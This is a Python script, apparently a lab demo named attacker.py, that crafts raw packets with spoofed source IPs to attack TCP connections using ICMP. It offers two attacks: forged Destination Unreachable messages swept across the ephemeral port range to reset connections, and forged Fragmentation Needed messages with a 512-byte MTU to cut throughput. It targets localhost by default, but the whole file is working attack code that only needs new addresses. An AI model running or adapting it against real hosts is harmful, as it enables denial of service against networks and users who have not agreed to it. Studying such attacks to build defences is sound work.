import socket
import struct
import random
import time
import os

CLIENT_IP = "127.0.0.1"       # Victim
SERVER_IP = "127.0.0.1"       # Spoofed for reset attack
ATTACKER_IP = "192.168.1.1"   # Spoofed router for throughput attack
SERVER_PORT = 8080
PORT_RANGE = (32768, 60999)   # Demo range (reduce for speed)
NEXT_HOP_MTU = 512
MAX_SEQ = 10000

def checksum(data):
    s = 0
    for i in range(0, len(data), 2):
        w = (data[i] << 8) + (data[i+1] if i+1 < len(data) else 0)
        s += w
    s = (s >> 16) + (s & 0xffff)
    s += (s >> 16)
    return ~s & 0xffff

def build_ip_header(src_ip, dst_ip, payload_len):
    version_ihl = (4 << 4) + 5
    tos = 0
    total_length = 20 + payload_len
    identification = random.randint(0, 65535)
    flags_fragment = 0
    ttl = 64
    proto = 1
    checksum_val = 0
    src = socket.inet_aton(src_ip)
    dst = socket.inet_aton(dst_ip)
    ip_header = struct.pack("!BBHHHBBH4s4s",
                             version_ihl, tos, total_length, identification,
                             flags_fragment, ttl, proto, checksum_val, src, dst)
    checksum_val = checksum(ip_header)
    ip_header = struct.pack("!BBHHHBBH4s4s",
                             version_ihl, tos, total_length, identification,
                             flags_fragment, ttl, proto, checksum_val, src, dst)
    return ip_header

def build_icmp_header(type_, code, rest_of_header, payload):
    icmp_checksum = 0
    header = struct.pack("!BBH4s", type_, code, icmp_checksum, rest_of_header)
    data = header + payload
    icmp_checksum = checksum(data)
    header = struct.pack("!BBH4s", type_, code, icmp_checksum, rest_of_header)
    return header

def build_embedded_headers(client_ip, server_ip, client_port, server_port, seq):
    version_ihl = (4 << 4) + 5
    tos = 0
    total_length = 40
    identification = 54321
    flags_fragment = 0
    ttl = 64
    proto = 6
    ip_checksum = 0
    src = socket.inet_aton(client_ip)
    dst = socket.inet_aton(server_ip)
    embedded_ip = struct.pack("!BBHHHBBH4s4s",
                               version_ihl, tos, total_length, identification,
                               flags_fragment, ttl, proto, ip_checksum, src, dst)
    tcp_header = struct.pack("!HHI", client_port, server_port, seq) + b"\x00\x00\x00\x00"
    return embedded_ip + tcp_header

def icmp_connection_reset(sock):
    print("[ATTACKER] ICMP Connection Reset Attack Started...")
    for port in range(PORT_RANGE[0], PORT_RANGE[1]):
        seq = random.randint(0, MAX_SEQ)
        embedded = build_embedded_headers(CLIENT_IP, SERVER_IP, port, SERVER_PORT, seq)
        rest_of_header = b"\x00\x00\x00\x00"
        icmp_header = build_icmp_header(3, 1, rest_of_header, embedded)
        ip_header = build_ip_header(SERVER_IP, CLIENT_IP, len(icmp_header) + len(embedded))
        packet = ip_header + icmp_header + embedded
        sock.sendto(packet, (CLIENT_IP, 0))
        print(f"[+] Sent ICMP Reset: Port={port}, Seq={seq}")
        time.sleep(0.05)

def icmp_throughput_reduction(sock):
    print("[ATTACKER] ICMP Throughput Reduction Attack Started...")
    with open("reduce_mss.flag", "w") as f:
        f.write("1")  # Signal client to simulate MSS reduction
    for port in range(PORT_RANGE[0], PORT_RANGE[1]):
        seq = random.randint(0, MAX_SEQ)
        embedded = build_embedded_headers(CLIENT_IP, SERVER_IP, port, SERVER_PORT, seq)
        mtu_bytes = struct.pack("!H", NEXT_HOP_MTU) + b"\x00\x00"
        icmp_header = build_icmp_header(3, 4, mtu_bytes, embedded)
        ip_header = build_ip_header(ATTACKER_IP, CLIENT_IP, len(icmp_header) + len(embedded))
        packet = ip_header + icmp_header + embedded
        sock.sendto(packet, (CLIENT_IP, 0))
        print(f"[+] Sent ICMP Frag Needed: Port={port}, Seq={seq}, MTU={NEXT_HOP_MTU}")
        time.sleep(0.05)

if __name__ == "__main__":
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    except PermissionError:
        print("[!] Run as root: sudo python3 attacker.py")
        exit(1)

    print("Choose Attack:\n1. Connection Reset\n2. Throughput Reduction\n3. Both")
    choice = input("> ")
    if choice == "1":
        icmp_connection_reset(sock)
    elif choice == "2":
        icmp_throughput_reduction(sock)
    elif choice == "3":
        icmp_connection_reset(sock)
        time.sleep(2)
        icmp_throughput_reduction(sock)
